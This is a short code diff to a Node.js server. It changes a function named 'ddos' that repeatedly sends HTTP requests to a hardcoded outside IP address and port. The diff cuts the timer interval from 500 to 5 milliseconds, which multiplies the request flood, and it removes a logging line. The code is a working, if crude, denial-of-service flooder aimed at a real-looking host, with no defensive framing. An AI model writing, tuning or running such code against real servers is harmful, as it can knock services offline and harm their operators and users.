@@ -10,7 +10,7 @@ res.send("randiap")
 res.end()
 
 })
-setInterval(ddos,500)
+setInterval(ddos,5)
 
 function ddos(){
     http.get('http://13.233.2.27:5000', {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
@@ -23,7 +23,6 @@ function ddos(){
       
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
-            console.log("hippe"+process.pid)
         });
       
       }).on("error", (err) => {
